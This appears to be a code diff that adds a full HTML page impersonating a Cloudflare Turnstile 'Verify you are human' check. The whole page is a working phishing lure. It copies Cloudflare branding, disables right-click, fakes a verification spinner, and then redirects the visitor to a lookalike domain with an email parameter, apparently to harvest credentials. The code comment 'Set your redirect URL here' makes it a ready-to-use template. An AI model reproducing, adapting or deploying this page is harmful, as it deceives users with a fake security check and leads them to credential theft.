@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1a1a1a;
+        }
+
+        .container {
+            width: 100%;
+            /* Reduced container size */
+            max-width: 380px; 
+            padding: 15px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        /* Header Text - Reduced Sizes */
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            margin: 0 0 6px 0;
+            color: #111;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: #666;
+            margin: 0 0 24px 0;
+        }
+
+        /* Turnstile Widget Box - Reduced Padding */
+        .turnstile-widget {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fdfdfd;
+            border: 1px solid #d1d5db;
+            border-radius: 4px;
+            padding: 12px 16px;
+            width: 100%;
+            box-sizing: border-box;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+        }
+
+        .widget-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Custom Checkbox Styling - Reduced Size */
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #333;
+            border-radius: 4px;
+            background: white;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        /* Hidden native checkbox */
+        #human-check {
+            display: none;
+        }
+
+        /* Checkmark (hidden initially) - Reduced Size */
+        .checkmark {
+            width: 12px;
+            height: 9px;
+            display: none;
+        }
+
+        /* Loading Spinner (hidden initially) - Reduced Size */
+        .spinner {
+            display: none;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #e5e7eb;
+            border-top: 2px solid #f38020;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Label - Reduced Font Size */
+        .widget-label {
+            font-size: 14px;
+            color: #333;
+            user-select: none;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        /* Right Side Branding - Reduced Sizes */
+        .widget-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 2px;
+        }
+
+        .brand-top {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .cf-logo {
+            width: 22px;
+            height: 13px;
+        }
+
+        .brand-name {
+            font-size: 9px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            color: #111;
+            text-transform: uppercase;
+        }
+
+        .links {
+            font-size: 10px;
+            color: #666;
+        }
+
+        .links a {
+            color: #666;
+            text-decoration: underline;
+            text-decoration-color: #ccc;
+            text-underline-offset: 2px;
+        }
+
+        .links a:hover {
+            color: #111;
+            text-decoration-color: #111;
+        }
+
+        .dot {
+            margin: 0 3px;
+            font-size: 8px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header Text -->
+        <div class="header">
+            <h1>One moment — confirming it's you</h1>
+            <p>Complete the check below to continue</p>
+        </div>
+
+        <!-- Turnstile Widget -->
+        <div class="turnstile-widget">
+            <!-- Left side: Checkbox and Text -->
+            <div class="widget-left">
+                <label for="human-check" class="custom-checkbox" id="custom-checkbox">
+                    <svg class="checkmark" id="checkmark" viewBox="0 0 16 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1 6L5.5 10.5L15 1" stroke="#f38020" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <div class="spinner" id="spinner"></div>
+                </label>
+                <input type="checkbox" id="human-check">
+                <label for="human-check" class="widget-label">Verify you are human</label>
+            </div>
+
+            <!-- Right side: Cloudflare Branding -->
+            <div class="widget-right">
+                <div class="brand-top">
+                    <svg class="cf-logo" viewBox="0 0 60 35" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M48 21.5C51 21.5 54 18.5 54 15C54 11.5 51 8.5 48 8.5C47.5 8.5 46.9 8.6 46.4 8.8C45 5.1 41.5 2.5 37.4 2.5C33.8 2.5 30.7 4.4 29.1 7.2C28.2 6.5 27 6.1 25.8 6.1C23 6.1 20.7 8.4 20.7 11.2C20.7 11.5 20.7 11.7 20.8 12C16.8 12.4 13.7 15.7 13.7 19.7C13.7 20 13.7 20.2 13.7 20.5H48V21.5Z" fill="#f38020"/>
+                        <path d="M40 28.5C42.2 28.5 44 26.7 44 24.5C44 22.3 42.2 20.5 40 20.5H16C13.8 20.5 12 22.3 12 24.5C12 26.7 13.8 28.5 16 28.5H40Z" fill="#faae40"/>
+                    </svg>
+                    <span class="brand-name">Cloudflare</span>
+                </div>
+                <div class="links">
+                    <a href="#">Privacy</a>
+                    <span class="dot">•</span>
+                    <a href="https://www.google.com/">Help</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        const checkbox = document.getElementById('human-check');
+        const customCheckbox = document.getElementById('custom-checkbox');
+        const checkmark = document.getElementById('checkmark');
+        const spinner = document.getElementById('spinner');
+
+        // Set your redirect URL here
+        const redirectUrl = "https://0aktreefunding.com/?email="; 
+
+        // Simulate the Cloudflare Turnstile verification process
+        checkbox.addEventListener('change', function() {
+            if (this.checked) {
+                // Show loading spinner
+                checkmark.style.display = 'none';
+                spinner.style.display = 'block';
+                customCheckbox.style.borderColor = '#cbd5e1'; // lighter border during loading
+
+                // Simulate network delay (1 second)
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    checkmark.style.display = 'block';
+                    customCheckbox.style.borderColor = '#f38020'; // Cloudflare orange border
+                    customCheckbox.style.backgroundColor = '#fff7ed'; // Very light orange background
+                    
+                    // Redirect to the URL after successful verification
+                    // Added a tiny extra delay (300ms) so the user sees the checkmark before the page changes
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 300);
+
+                }, 1000); 
+            } else {
+                // Reset state if unchecked
+                checkmark.style.display = 'none';
+                spinner.style.display = 'none';
+                customCheckbox.style.borderColor = '#333';
+                customCheckbox.style.backgroundColor = 'white';
+            }
+        });
+    </script>
+</body>
+</html>
